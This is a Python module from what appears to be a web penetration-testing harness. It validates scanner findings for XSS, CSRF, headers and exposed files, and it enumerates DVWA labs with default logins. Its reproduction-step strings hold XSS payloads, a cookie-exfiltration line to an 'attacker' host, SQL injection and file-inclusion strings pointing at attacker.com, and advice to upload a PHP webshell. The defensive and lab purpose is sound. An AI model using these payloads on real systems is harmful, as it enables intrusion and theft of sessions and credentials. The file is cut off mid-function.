"""
modules/web_validation_agent.py
================================
AI Red Team Harness v3 — Web Application Security Validation Agent

Applies strict, evidence-gated validation to every finding produced by
WebVAPTEngine before it appears in any report.

Rules (from spec):
  RULE 1  — No finding is HIGH/CRITICAL unless exploitation is verified OR strong
             multi-step evidence exists.
  RULE 2  — Reflection alone is never a vulnerability.
  RULE 3  — HTTP 500 alone is NOT SQL Injection.
  RULE 4  — XSS: ONLY confirm if payload executes (script/event/DOM injection).
  RULE 5  — CSRF: ONLY confirm if state-changing action works WITHOUT token.
  RULE 6  — Sensitive files: robots.txt → INFO; confirm only with actual data.
  RULE 7  — Security headers: do NOT emit HIGH unless exploit is demonstrated.
  RULE 8  — WAF block is NOT a successful exploit.
  RULE 9  — DVWA mode: auto-enumerate DVWA vulnerability endpoints on detection.

Every finding leaving this agent carries:
  - confidence_pct (0-100)
  - validation_status: "confirmed" | "potential" | "informational"
  - exploit_status:    "CONFIRMED" | "UNVERIFIED"
  - comparison_result: diff between baseline and attack response
  - raw_request, raw_response_excerpt, reproduction_steps
  - validation_logic, fp_checks_performed, exploitability

Python: 3.11+
"""

from __future__ import annotations

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable

from utils.logger import get_logger

logger = get_logger(__name__)

# ---------------------------------------------------------------------------
# Confidence thresholds (0-100 scale)
# ---------------------------------------------------------------------------

CONFIDENCE_VERIFIED     = 95
CONFIDENCE_STRONG       = 85
CONFIDENCE_MODERATE     = 65
CONFIDENCE_WEAK         = 35
CONFIDENCE_INSUFFICIENT = 20

_MIN_CONFIDENCE: dict[str, int] = {
    "CRITICAL": 80,
    "HIGH":     70,
    "MEDIUM":   40,
    "LOW":      20,
    "INFO":     0,
}

# ---------------------------------------------------------------------------
# Cache header detection
# ---------------------------------------------------------------------------

_CACHE_HIT_RE = re.compile(
    r"^(HIT|STALE|REVALIDATED|UPDATING|HIT from cloudflare)$",
    re.I,
)

_CACHE_HEADER_NAMES = (
    "cf-cache-status",
    "x-cache",
    "x-cache-status",
    "x-varnish",
    "age",
    "cdn-cache-status",
    "x-cdn-cache-status",
)

# ---------------------------------------------------------------------------
# XSS execution-context patterns
# ---------------------------------------------------------------------------

_XSS_EXEC_CONTEXT_RE = re.compile(
    r"JavaScript context"
    r"|HTML attribute context"
    r"|URL attribute context"
    r"|in JavaScript"
    r"|in HTML attribute"
    r"|event handler",
    re.I,
)

_XSS_SCRIPT_CTX_RE = re.compile(r"\bJavaScript\b", re.I)
_XSS_ATTR_CTX_RE   = re.compile(r"\bHTML attribute\b", re.I)
_XSS_URL_CTX_RE    = re.compile(r"\bURL attribute\b", re.I)

# ---------------------------------------------------------------------------
# False-positive patterns for general findings
# ---------------------------------------------------------------------------

_HTTP500_ONLY_RE = re.compile(
    r"<title>\s*500 Internal Server Error\s*</title>",
    re.I,
)
_WAF_BLOCK_RE = re.compile(
    r"attention required.*?cloudflare|request blocked|incapsula incident",
    re.I | re.S,
)

# DVWA markers
_DVWA_MARKER_RE = re.compile(
    r"Damn Vulnerable Web Application|DVWA|dvwaPage|dvwa_security",
    re.I,
)

# Sensitive content pattern (mirrors web_vapt_engine._SENSITIVE_CONTENT_RE)
_SENSITIVE_CONTENT_RE = re.compile(
    r"DB_PASSWORD|DB_PASS|API_KEY|SECRET_KEY|AWS_SECRET"
    r"|private key|-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE|password\s*="
    r"|db_password\s*=|jdbc:[a-z]+://",
    re.I,
)

# ---------------------------------------------------------------------------
# ValidationOutcome — carries all enrichment data
# ---------------------------------------------------------------------------

@dataclass
class ValidationOutcome:
    """
    Enriched finding data produced by the agent.
    Merged back into WebFinding by WebValidationAgent.validate_all().
    """
    confidence_pct:       int     = 0
    validation_status:    str     = "potential"    # confirmed | potential | informational
    exploit_status:       str     = "UNVERIFIED"   # CONFIRMED | UNVERIFIED
    comparison_result:    str     = ""
    raw_request:          str     = ""
    raw_response_excerpt: str     = ""
    reproduction_steps:   list[str] = field(default_factory=list)
    validation_logic:     str     = ""
    fp_checks_performed:  list[str] = field(default_factory=list)
    exploitability:       str     = ""
    downgraded_severity:  str | None = None
    downgrade_reason:     str     = ""


# ---------------------------------------------------------------------------
# XSS Validator (Rule 4)
# ---------------------------------------------------------------------------

class XSSValidator:
    """
    Rule 4: ONLY confirm XSS if payload executes in browser, DOM injection
    confirmed, or alert()/event trigger observed. Reflection alone = NOT XSS.

    Operates on finding data — no HTTP requests needed (context already in evidence).
    """

    def validate(self, finding: Any) -> ValidationOutcome:
        outcome  = ValidationOutcome()
        evidence = getattr(finding, "evidence", "") or ""
        title    = getattr(finding, "title",    "") or ""
        ep       = getattr(finding, "endpoint", "") or ""
        param    = getattr(finding, "parameter", "") or ""
        comp     = getattr(finding, "comparison_result", "") or ""

        outcome.fp_checks_performed.append("xss_context_analysis")
        outcome.comparison_result = comp or evidence[:200]

        # Determine execution context from evidence string
        if _XSS_SCRIPT_CTX_RE.search(evidence):
            # Script context → strong execution signal
            outcome.confidence_pct    = CONFIDENCE_STRONG
            outcome.validation_status = "confirmed"
            outcome.exploit_status    = "CONFIRMED"
            outcome.validation_logic  = (
                "Marker reflected inside a JavaScript execution context (<script> block). "
                "This represents a HIGH-confidence XSS vector where injected payloads "
                "would execute as JavaScript."
            )
            outcome.exploitability    = (
                "HIGH — Script context injection allows arbitrary JS execution. "
                "Replace test marker with alert(1) or equivalent to confirm."
            )
            outcome.reproduction_steps = [
                f"1. Send GET/POST to {ep} with {param}=<script>alert(1)</script>",
                "2. Observe script executes in browser (alert dialog or DOM change).",
                "3. Escalate to cookie theft payload: document.location='attacker/?c='+document.cookie",
            ]
            outcome.fp_checks_performed.append("execution_context: javascript_script_block")

        elif _XSS_ATTR_CTX_RE.search(evidence):
            # Attribute context — requires event handler or dangling markup
            outcome.confidence_pct    = CONFIDENCE_MODERATE
            outcome.validation_status = "potential"
            outcome.exploit_status    = "UNVERIFIED"
            outcome.validation_logic  = (
                "Marker reflected inside an HTML attribute. "
                "Exploitation requires injecting a closing quote and on* event handler. "
                "Severity remains MEDIUM until execution is confirmed."
            )
            outcome.exploitability    = (
                "MEDIUM — Attribute context may permit injection via: \"><img onerror=alert(1)>. "
                "Depends on whether quotes are escaped."
            )
            outcome.reproduction_steps = [
                f"1. Send GET/POST to {ep} with {param}=\"><img src=x onerror=alert(1)>",
                "2. Check if response contains the unescaped payload inside an attribute.",
                "3. Confirm execution in browser before escalating to HIGH.",
            ]
            outcome.fp_checks_performed.append("execution_context: html_attribute")

        elif _XSS_URL_CTX_RE.search(evidence):
            # URL attribute — javascript: pseudo-protocol
            outcome.confidence_pct    = CONFIDENCE_MODERATE
            outcome.validation_status = "potential"
            outcome.exploit_status    = "UNVERIFIED"
            outcome.validation_logic  = (
                "Marker reflected in a URL attribute (href/src/action). "
                "javascript: pseudo-protocol may allow execution if attribute is not validated."
            )
            outcome.exploitability    = (
                "MEDIUM — URL context injection. Test with: javascript:alert(1) as value."
            )
            outcome.reproduction_steps = [
                f"1. Send GET/POST to {ep} with {param}=javascript:alert(1)",
                "2. Check rendered HTML for <a href='javascript:alert(1)'> pattern.",
                "3. Click the link in browser to confirm code execution.",
            ]
            outcome.fp_checks_performed.append("execution_context: url_attribute")

        else:
            # HTML body or unknown — reflection only, no execution context
            outcome.confidence_pct    = CONFIDENCE_WEAK
            outcome.validation_status = "potential"
            outcome.exploit_status    = "UNVERIFIED"
            outcome.downgraded_severity = "LOW"
            outcome.downgrade_reason    = (
                "Reflection in HTML body without confirmed execution context. "
                "Per Rule 4: reflection alone is NOT XSS. Downgraded to LOW/UNVERIFIED."
            )
            outcome.validation_logic  = (
                "Marker was reflected in the HTML body context. "
                "HTML body reflection requires a full tag injection to execute JavaScript. "
                "The test marker used (<xssXXX>) does not contain executable JavaScript. "
                "Manual testing with a real payload required to confirm execution."
            )
            outcome.exploitability    = (
                "LOW — HTML body reflection. Test with <img src=x onerror=alert(1)> "
                "to determine if tags survive server-side sanitisation."
            )
            outcome.reproduction_steps = [
                f"1. Send GET/POST to {ep} with {param}=<img src=x onerror=alert(1)>",
                "2. Inspect response HTML for unencoded tag.",
                "3. Load in browser and verify onerror fires before classifying as XSS.",
            ]
            outcome.fp_checks_performed.append("execution_context: html_body_no_exec_signal")

        # Raw request reconstruction
        outcome.raw_request = (
            f"GET {ep}?{param}=<PAYLOAD> HTTP/1.1\n"
            f"Host: (target)\n"
            f"Accept: text/html\n"
        )
        outcome.raw_response_excerpt = evidence[:400]

        return outcome


# ---------------------------------------------------------------------------
# CSRF Validator (Rule 5)
# ---------------------------------------------------------------------------

class CSRFValidator:
    """
    Rule 5: ONLY confirm CSRF if state-changing action works WITHOUT token AND
    action succeeds on a victim session context. Missing token field alone = NOT vulnerability.

    Makes live HTTP requests: baseline POST (with token) vs. tokenless POST.
    """

    def __init__(
        self,
        get_fn:  Callable | None,
        post_fn: Callable | None,
        kill_fn: Callable[[], bool],
    ) -> None:
        self._get  = get_fn
        self._post = post_fn
        self._kill = kill_fn

    _FIELD_LIST_RE = re.compile(r"\[([^\]]+)\]")

    async def validate(self, finding: Any) -> ValidationOutcome:
        outcome = ValidationOutcome()
        outcome.comparison_result = getattr(finding, "comparison_result", "") or ""

        if self._post is None:
            outcome.validation_status = "potential"
            outcome.confidence_pct    = CONFIDENCE_WEAK
            outcome.validation_logic  = (
                "CSRF requires live form submission to confirm. "
                "HTTP client not available — marking as POTENTIAL."
            )
            outcome.fp_checks_performed.append("no_http_client")
            outcome.exploitability = (
                "Cannot confirm without tokenless POST. Manual test required."
            )
            return outcome

        action   = getattr(finding, "endpoint",  "") or ""
        evidence = getattr(finding, "evidence",  "") or ""

        # Extract field names from evidence string: "Fields: ['field1', 'field2']"
        field_names: list[str] = []
        m = self._FIELD_LIST_RE.search(evidence)
        if m:
            field_names = [
                s.strip().strip("'\"")
                for s in m.group(1).split(",")
                if s.strip().strip("'\"")
            ]

        # Build test data with safe dummy values
        test_data  = {f: "test_value" for f in field_names}
        outcome.raw_request = (
            f"POST {action} HTTP/1.1\n"
            f"Host: (target)\n"
            f"Content-Type: application/x-www-form-urlencoded\n\n"
            + "&".join(f"{k}=test_value" for k in field_names)
        )

        outcome.fp_checks_performed.append("tokenless_post_attempt")

        # Tokenless POST
        try:
            resp = await self._post(action, data=test_data)
        except Exception as exc:
            outcome.validation_status = "potential"
            outcome.confidence_pct    = CONFIDENCE_WEAK
            outcome.validation_logic  = f"POST to {action} raised exception: {exc}"
            outcome.exploitability    = "Cannot confirm — request failed."
            return outcome

        if resp is None:
            outcome.validation_status = "potential"
            outcome.confidence_pct    = CONFIDENCE_WEAK
            outcome.validation_logic  = f"No response from {action}."
            outcome.exploitability    = "Cannot confirm — no response."
            return outcome

        status = resp.status_code
        body   = getattr(resp, "text", "") or ""

        outcome.raw_response_excerpt = body[:400]
        outcome.fp_checks_performed.append(
            f"tokenless_post_response: HTTP {status}"
        )

        # Outcome logic: 200/201 without redirect = form processed without token
        if status in (200, 201):
            # Check for error indicators in the body
            rejected = bool(re.search(
                r"invalid token|csrf|forbidden|access denied|403|security",
                body, re.I
            ))
            if rejected:
                outcome.validation_status = "informational"
                outcome.confidence_pct    = CONFIDENCE_WEAK
                outcome.exploit_status    = "UNVERIFIED"
                outcome.downgraded_severity = "LOW"
                outcome.downgrade_reason    = (
                    "Tokenless POST returned HTTP 200 but body contains CSRF rejection "
                    "or security error message — server validates token server-side."
                )
                outcome.validation_logic  = (
                    "HTTP 200 response contained CSRF/forbidden keyword. "
                    "Token appears to be validated server-side. Not a confirmed CSRF."
                )
                outcome.exploitability    = (
                    "Not confirmed. Server-side CSRF validation appears to be active."
                )
                outcome.fp_checks_performed.append("body_contains_csrf_rejection")
            else:
                # Tokenless POST succeeded and no rejection found
                outcome.validation_status = "confirmed"
                outcome.confidence_pct    = CONFIDENCE_STRONG
                outcome.exploit_status    = "CONFIRMED"
                outcome.validation_logic  = (
                    f"Tokenless POST to {action} returned HTTP {status} without "
                    "any CSRF rejection in the response. State-changing action "
                    "succeeded without a CSRF token — confirmed CSRF vulnerability."
                )
                outcome.exploitability = (
                    "HIGH — Attacker can forge cross-origin POST requests that succeed "
                    "on authenticated victim sessions. Craft a malicious HTML page with "
                    "<form method=POST action={action}> and auto-submit."
                )
                outcome.reproduction_steps = [
                    f"1. Authenticate as a test user in a browser.",
                    f"2. In a separate origin, submit: POST {action} with form fields but NO CSRF token.",
                    f"3. Observe HTTP {status} response — action succeeded.",
                    "4. Escalate: create an HTML page that auto-submits to confirm cross-origin impact.",
                ]
                outcome.comparison_result = (
                    "Baseline: form requires CSRF token (field absent from visible inputs). "
                    f"Attack: tokenless POST to {action} returned HTTP {status} — accepted."
                )
        elif status in (302, 303):
            # Redirect after tokenless POST — may indicate success or login redirect
            location = resp.headers.get("location", "") if hasattr(resp, "headers") else ""
            if "login" in location.lower() or "auth" in location.lower():
                outcome.validation_status = "informational"
                outcome.confidence_pct    = CONFIDENCE_INSUFFICIENT
                outcome.exploit_status    = "UNVERIFIED"
                outcome.downgraded_severity = "INFO"
                outcome.downgrade_reason    = (
                    "Tokenless POST redirected to login page — "
                    "session cookie required; not exploitable without victim session."
                )
                outcome.validation_logic  = (
                    f"POST to {action} redirected to {location}. "
                    "CSRF only applies if victim is already authenticated."
                )
                outcome.exploitability    = (
                    "Only exploitable on authenticated victim sessions. "
                    "Cannot confirm without victim session cookie."
                )
                outcome.fp_checks_performed.append("redirect_to_login_no_session")
            else:
                # Redirect without login — possible success
                outcome.validation_status = "potential"
                outcome.confidence_pct    = CONFIDENCE_MODERATE
                outcome.exploit_status    = "UNVERIFIED"
                outcome.validation_logic  = (
                    f"Tokenless POST to {action} returned HTTP {status} redirect to {location}. "
                    "May indicate successful form processing. Manual verification required."
                )
                outcome.exploitability = (
                    "MEDIUM — Possible CSRF. Redirect without login suggests form may have been processed. "
                    "Confirm with authenticated victim session."
                )
                outcome.comparison_result = (
                    "Baseline: form has no CSRF token field. "
                    f"Attack: tokenless POST → HTTP {status} redirect to {location}."
                )
        else:
            # 403, 405, 422 etc. — server rejected the request
            outcome.validation_status   = "informational"
            outcome.confidence_pct      = CONFIDENCE_INSUFFICIENT
            outcome.exploit_status      = "UNVERIFIED"
            outcome.downgraded_severity = "LOW"
            outcome.downgrade_reason    = (
                f"Tokenless POST returned HTTP {status} — request was rejected. "
                "Server-side CSRF protection appears effective."
            )
            outcome.validation_logic  = (
                f"POST to {action} without token returned HTTP {status}. "
                "Missing token in visible form fields does not constitute a CSRF vulnerability "
                "when the server rejects tokenless requests."
            )
            outcome.exploitability    = (
                "Not exploitable — server rejected tokenless POST."
            )
            outcome.fp_checks_performed.append(f"server_rejected_tokenless_post: {status}")

        return outcome


# ---------------------------------------------------------------------------
# Header Finding Validator (Rule 7)
# ---------------------------------------------------------------------------

class HeaderFindingValidator:
    """
    Rule 7: Do NOT emit HIGH for missing security headers unless exploit demonstrated.
    Headers that are best practice but not directly exploitable → LOW or INFO.
    """

    # Headers that should never be emitted as HIGH based on absence alone
    _DOWNGRADE_TO_MEDIUM = {
        "strict-transport-security",   # MITM required — indirect risk
    }
    _DOWNGRADE_TO_LOW = {
        "x-content-type-options",
        "referrer-policy",
        "permissions-policy",
        "x-xss-protection",
        "feature-policy",
    }
    _DOWNGRADE_TO_INFO = {
        "x-powered-by",    # disclosure only
    }

    def validate(self, finding: Any) -> ValidationOutcome:
        outcome  = ValidationOutcome()
        title    = getattr(finding, "title",    "") or ""
        evidence = getattr(finding, "evidence", "") or ""
        _sev     = getattr(finding, "severity", "INFO")
        severity = _sev.value if hasattr(_sev, "value") else str(_sev)
        param    = (getattr(finding, "parameter", "") or "").lower()

        outcome.fp_checks_performed.append("header_missing_only_check")
        outcome.validation_logic = (
            "Per Rule 7: missing security headers are configuration issues, "
            "not directly exploitable vulnerabilities. "
            "Severity capped unless an exploit chain is demonstrated."
        )
        outcome.comparison_result = (
            f"Baseline: header '{param}' absent from server response. "
            "No exploit demonstrated — classified as configuration gap."
        )
        outcome.exploitability = (
            "Not directly exploitable. Requires additional attacker conditions "
            "(e.g., MITM, social engineering, co-located vulnerability) to leverage."
        )

        if param in self._DOWNGRADE_TO_MEDIUM and severity.upper() == "HIGH":
            outcome.downgraded_severity = "MEDIUM"
            outcome.downgrade_reason    = (
                f"Missing '{param}' is a best-practice gap but requires active MITM "
                "to exploit. Downgraded from HIGH to MEDIUM per Rule 7."
            )
            outcome.confidence_pct    = CONFIDENCE_MODERATE
            outcome.validation_status = "potential"

        elif param in self._DOWNGRADE_TO_LOW and severity.upper() in ("HIGH", "MEDIUM"):
            outcome.downgraded_severity = "LOW"
            outcome.downgrade_reason    = (
                f"Missing '{param}' is a defence-in-depth header, "
                "not directly exploitable. Downgraded to LOW per Rule 7."
            )
            outcome.confidence_pct    = CONFIDENCE_WEAK
            outcome.validation_status = "informational"

        elif param in self._DOWNGRADE_TO_INFO:
            outcome.downgraded_severity = "INFO"
            outcome.downgrade_reason    = "Informational disclosure header — downgraded to INFO."
            outcome.confidence_pct    = CONFIDENCE_INSUFFICIENT
            outcome.validation_status = "informational"

        else:
            # X-Frame-Options (clickjacking), CSP (XSS) — keep as-is, they are legitimate
            outcome.confidence_pct    = int(round(getattr(finding, "confidence", 0.8) * 100))
            outcome.validation_status = "potential"
            outcome.validation_logic += (
                f" Header '{param}' absence represents a legitimate risk and is not downgraded."
            )

        outcome.exploit_status = "UNVERIFIED"
        return outcome


# ---------------------------------------------------------------------------
# Sensitive File Validator (Rule 6)
# ---------------------------------------------------------------------------

class SensitiveFileValidator:
    """
    Rule 6: Sensitive files require actual data to confirm.
    - robots.txt alone → INFORMATIONAL
    - HTTP 200 without sensitive content → LOW
    - Actual credentials in body → CONFIRMED CRITICAL (keep)
    """

    def validate(self, finding: Any) -> ValidationOutcome:
        outcome  = ValidationOutcome()
        endpoint = getattr(finding, "endpoint", "") or ""
        evidence = getattr(finding, "evidence", "") or ""
        severity = str(getattr(finding, "severity", "LOW"))

        outcome.fp_checks_performed.append("sensitive_file_content_check")
        outcome.comparison_result = (
            f"File at {endpoint} returned HTTP 200. "
            "Content analysed for credentials and secrets."
        )

        if "robots.txt" in endpoint.lower():
            outcome.validation_status   = "informational"
            outcome.confidence_pct      = 20
            outcome.exploit_status      = "UNVERIFIED"
            outcome.downgraded_severity = "INFO"
            outcome.downgrade_reason    = (
                "robots.txt is publicly accessible by design. "
                "Existence alone is not a security vulnerability."
            )
            outcome.validation_logic    = (
                "robots.txt presence is informational — it may disclose path structure "
                "but is not a vulnerability without additional sensitive content."
            )
            outcome.exploitability      = (
                "Not exploitable directly. Review for paths that disclose internal structure."
            )
            outcome.fp_checks_performed.append("robots_txt_informational")
            return outcome

        if _SENSITIVE_CONTENT_RE.search(evidence):
            outcome.validation_status = "confirmed"
            outcome.confidence_pct    = CONFIDENCE_VERIFIED
            outcome.exploit_status    = "CONFIRMED"
            outcome.validation_logic  = (
                "Response body contains patterns matching credentials or secret keys. "
                "Confirmed sensitive data exposure."
            )
            outcome.exploitability    = (
                "CRITICAL — Credentials or secrets found in publicly accessible file. "
                "Attacker can extract and use these values immediately."
            )
            outcome.comparison_result = (
                f"File at {endpoint} returned HTTP 200 with content matching "
                "credential patterns (DB_PASSWORD, API_KEY, private key, etc.)."
            )
            outcome.fp_checks_performed.append("sensitive_content_confirmed")
        elif ".git/" in endpoint.lower():
            outcome.validation_status = "confirmed"
            outcome.confidence_pct    = CONFIDENCE_STRONG
            outcome.exploit_status    = "CONFIRMED"
            outcome.validation_logic  = (
                "Git metadata accessible. Enables source code reconstruction "
                "via git clone of the exposed repository."
            )
            outcome.exploitability    = (
                "HIGH — git repository metadata exposed. "
                "Use git-dumper to reconstruct full source code history."
            )
            outcome.comparison_result = (
                f"Git metadata at {endpoint} accessible without authentication."
            )
            outcome.fp_checks_performed.append("git_metadata_confirmed")
        else:
            # HTTP 200 but no confirmed sensitive content
            outcome.validation_status   = "potential"
            outcome.confidence_pct      = CONFIDENCE_WEAK
            outcome.exploit_status      = "UNVERIFIED"
            outcome.validation_logic    = (
                "File returned HTTP 200 but no credential patterns detected in response. "
                "Manual review recommended."
            )
            outcome.exploitability      = (
                "LOW — File accessible but no immediately sensitive data confirmed. "
                "Review full content manually."
            )
            outcome.fp_checks_performed.append("no_sensitive_content_in_excerpt")

        return outcome


# ---------------------------------------------------------------------------
# DVWA Enumerator (Rule 9)
# ---------------------------------------------------------------------------

_DVWA_PATHS = [
    "/vulnerabilities/sqli/",
    "/vulnerabilities/xss_r/",
    "/vulnerabilities/xss_s/",
    "/vulnerabilities/csrf/",
    "/vulnerabilities/fi/",
    "/vulnerabilities/upload/",
]

_DVWA_LOGIN_PATHS = ["/login.php", "/dvwa/login.php", "/DVWA/login.php"]

_DVWA_CREDENTIALS = [
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "dvwa"),
]


class DVWAEnumerator:
    """
    Rule 9: If target is DVWA, automatically enumerate vulnerability endpoints
    and return annotated findings for each active module.

    Does NOT attempt exploitation — identifies which modules are accessible
    and marks them for manual/automated testing.
    """

    def __init__(
        self,
        get_fn:  Callable | None,
        post_fn: Callable | None,
        kill_fn: Callable[[], bool],
    ) -> None:
        self._get  = get_fn
        self._post = post_fn
        self._kill = kill_fn

    async def is_dvwa(self, base_url: str) -> bool:
        """Return True if target appears to be a DVWA instance."""
        if not self._get:
            return False
        base = base_url.rstrip("/")
        for path in _DVWA_LOGIN_PATHS:
            resp = await self._get(base + path)
            if resp and _DVWA_MARKER_RE.search(getattr(resp, "text", "")):
                return True
        # Also check base URL
        resp = await self._get(base + "/")
        if resp and _DVWA_MARKER_RE.search(getattr(resp, "text", "")):
            return True
        return False

    async def _login(self, base_url: str) -> bool:
        """Attempt DVWA login; return True if session cookie established."""
        if not self._post or not self._get:
            return False
        base = base_url.rstrip("/")
        for login_path in _DVWA_LOGIN_PATHS:
            url = base + login_path
            resp = await self._get(url)
            if not resp:
                continue
            body = getattr(resp, "text", "") or ""
            if not _DVWA_MARKER_RE.search(body):
                continue
            # Extract user_token from login form (DVWA CSRF token)
            token_m = re.search(
                r'<input[^>]+name=[\'"]user_token[\'"][^>]+value=[\'"]([^\'"]+)[\'"]',
                body, re.I
            )
            token = token_m.group(1) if token_m else ""
            for username, password in _DVWA_CREDENTIALS:
                data = {
                    "username":   username,
                    "password":   password,
                    "Login":      "Login",
                    "user_token": token,
                }
                resp2 = await self._post(url, data=data)
                if resp2 is None:
                    continue
                loc = resp2.headers.get("location", "") if hasattr(resp2, "headers") else ""
                if "index.php" in loc or resp2.status_code in (200, 302):
                    logger.info("DVWA: logged in as %s", username)
                    return True
        return False

    async def enumerate(self, base_url: str) -> list[Any]:
        """
        Check if target is DVWA; if so, probe each vulnerability endpoint
        and return a list of WebFinding objects marking active modules.
        """
        from modules.web_vapt_engine import WebFinding, WebRiskLevel  # deferred import

        if not base_url or not self._get:
            return []

        if not await self.is_dvwa(base_url):
            return []

        logger.info("DVWA detected at %s — enumerating vulnerability modules", base_url)
        findings: list[Any] = []
        base     = base_url.rstrip("/")

        # Attempt login to access protected modules
        logged_in = await self._login(base_url)
        if not logged_in:
            logger.warning("DVWA: could not authenticate — enumeration may be partial")

        import hashlib
        import time as _time

        for path in _DVWA_PATHS:
            if self._kill():
                break
            url  = base + path
            resp = await self._get(url)
            if resp is None:
                continue
            status = resp.status_code
            body   = getattr(resp, "text", "") or ""

            module_name = path.strip("/").replace("vulnerabilities/", "")
            is_accessible = status == 200 and _DVWA_MARKER_RE.search(body)

            if not is_accessible:
                continue

            # Determine category
            if "sqli" in path:
                category = "sqli"
                desc = (
                    "DVWA SQL Injection module is accessible. "
                    "Submit 1' OR '1'='1 or 1 UNION SELECT 1,2-- in the ID field."
                )
                sev  = WebRiskLevel.HIGH
                cvss = 8.8
            elif "xss_r" in path:
                category = "xss"
                desc = (
                    "DVWA Reflected XSS module is accessible. "
                    "Submit <script>alert(1)</script> in the name field."
                )
                sev  = WebRiskLevel.HIGH
                cvss = 7.2
            elif "xss_s" in path:
                category = "xss"
                desc = (
                    "DVWA Stored XSS module is accessible. "
                    "Store a persistent XSS payload in the message board."
                )
                sev  = WebRiskLevel.HIGH
                cvss = 8.2
            elif "csrf" in path:
                category = "csrf"
                desc = (
                    "DVWA CSRF module is accessible. "
                    "The password-change form can be triggered cross-origin."
                )
                sev  = WebRiskLevel.HIGH
                cvss = 7.5
            elif "fi" in path:
                category = "lfi"
                desc = (
                    "DVWA File Inclusion module is accessible. "
                    "Test: ?page=../../etc/passwd (LFI) and ?page=http://attacker.com/shell.txt (RFI)."
                )
                sev  = WebRiskLevel.CRITICAL
                cvss = 9.0
            elif "upload" in path:
                category = "file_upload"
                desc = (
                    "DVWA File Upload module is accessible. "
                    "Upload a PHP webshell with .php extension to achieve RCE."
                )
                sev  = WebRiskLevel.CRITICAL
                cvss = 9.8
            else:
                category = "general"
                desc = f"DVWA module at {path} is accessible."
                sev  = WebRiskLevel.MEDIUM
                cvss = 5.0

            uid = hashlib.md5(
                f"dvwa{path}{base_url}".encode(), usedforsecurity=False
            ).hexdigest()[:8].upper()

            f = WebFinding(
                id          = f"DVWA-{uid}",
                title       = f"DVWA Module Accessible — {module_name}",
                severity    = sev,
                confidence  = 0.90,
                endpoint    = url,
                parameter   = "",
                description = desc,
                evidence    = f"HTTP {status} for {url}. DVWA session active: {logged_in}",
                remediation = (
                    "DVWA is intentionally vulnerable. "
                    "Use only in isolated lab environments. "
                    "Never expose DVWA to the internet or production networks."
                ),
                cwe        = "CWE-1035",
                owasp      = "A01:2021 — Broken Access Control",
                references = ["https://dvwa.co.uk/", "https://github.com/digininja/DVWA"],
                cvss_score  = cvss,
                module      = f"dvwa_{category}",
                confidence_pct    = 90,
                validation_status = "confirmed",
                exploit_status    = "CONFIRMED",
                comparison_result = (
                    f"DVWA module at {path} returned HTTP {status}. "
                    f"Authenticated: {logged_in}. Module is active and ready for testing."
                ),
                validation_logic  = (
                    "DVWA-specific module detected and accessible. "
                    "DVWA modules are designed to be exploitable — treat all findings as CONFIRMED "
                    "in the context of authorized lab testing."
                ),
                exploitability    = desc,
                reproduction_steps = [
                    f"1. Navigate to {url}",
                    "2. Set DVWA Security Level to Low in /security.php",
                    f"3. {desc}",
                ],
            )
            findings.append(f)
            logger.info("DVWA module confirmed: %s", path)

        if findings:
            logger.info(
                "DVWA enumeration complete: %d active modules found", len(findings)
            )
        return findings


# ---------------------------------------------------------------------------
# General Finding Validator
# ---------------------------------------------------------------------------

class FindingValidator:
    """
    Applies evidence-gating rules to any WebFinding.
    Does not make HTTP requests — operates on finding data alone.
    """

    _HTTP500_ONLY_TITLE_RE = re.compile(r"\b500\b|\binternal server error\b", re.I)

    def validate(self, finding: Any) -> ValidationOutcome:
        outcome = ValidationOutcome()
        evidence    = getattr(finding, "evidence",    "") or ""
        description = getattr(finding, "description", "") or ""
        severity    = str(getattr(finding, "severity", "INFO"))
        confidence  = getattr(finding, "confidence", 0.0)
        title       = getattr(finding, "title", "") or ""

        conf_pct = int(round(confidence * 100))
        outcome.confidence_pct = conf_pct
        outcome.comparison_result = (
            getattr(finding, "comparison_result", "") or
            f"Engine detection: {evidence[:150]}"
        )

        # HTTP 500 alone is NOT SQLi
        _sqli_title = any(
            kw in title.lower()
            for kw in ("sqli", "sql injection", "sql error", "injection")
        )
        if _HTTP500_ONLY_RE.search(evidence) and _sqli_title:
            outcome.validation_status  = "potential"
            outcome.confidence_pct     = CONFIDENCE_WEAK
            outcome.exploit_status     = "UNVERIFIED"
            outcome.downgraded_severity = "MEDIUM"
            outcome.downgrade_reason   = (
                "HTTP 500 alone is not sufficient evidence of SQL injection. "
                "Downgraded to MEDIUM / POTENTIAL."
            )
            outcome.fp_checks_performed.append("http500_not_sqli_evidence")
            outcome.validation_logic   = (
                "HTTP 500 responses can result from application errors unrelated to SQL. "
                "Boolean confirmation or DB error fingerprint required."
            )
            outcome.exploitability = "Unconfirmed — HTTP 500 without DB error fingerprint."
            return outcome

        # WAF block is not an exploit
        if _WAF_BLOCK_RE.search(evidence):
            outcome.validation_status  = "informational"
            outcome.confidence_pct     = CONFIDENCE_INSUFFICIENT
            outcome.exploit_status     = "UNVERIFIED"
            outcome.downgraded_severity = "INFO"
            outcome.downgrade_reason   = "WAF block detected — not a confirmed vulnerability."
            outcome.fp_checks_performed.append("waf_block_detected")
            outcome.validation_logic   = "WAF blocked the request. This is not an exploitation proof."
            outcome.exploitability     = "Not exploitable — WAF is blocking the attack vector."
            return outcome

        # Minimum confidence gate
        min_conf = _MIN_CONFIDENCE.get(severity.upper(), 0)
        if conf_pct < min_conf:
            outcome.validation_status  = "potential"
            outcome.downgraded_severity = _downgrade_severity(severity)
            outcome.downgrade_reason   = (
                f"Confidence {conf_pct}% is below the minimum {min_conf}% "
                f"required for {severity} severity."
            )
            outcome.fp_checks_performed.append("confidence_below_threshold")

        if outcome.validation_status == "potential" and conf_pct >= CONFIDENCE_STRONG:
            outcome.validation_status = "confirmed"
            outcome.exploit_status    = "CONFIRMED"
        elif conf_pct >= CONFIDENCE_STRONG and not outcome.downgraded_severity:
            outcome.validation_status = "confirmed"
            outcome.exploit_status    = "CONFIRMED"

        outcome.validation_logic = (
            f"Confidence {conf_pct}% based on engine detection. "
            f"Evidence: {evidence[:200]}"
        )
        outcome.exploitability = (
            "Requires manual verification to assess full impact scope."
            if outcome.validation_status == "potential"
            else "Evidence supports exploitability as described."
        )
        return outcome


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _downgrade_severity(severity: str) -> str:
    order = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    try:
        idx = order.index(severity.upper())
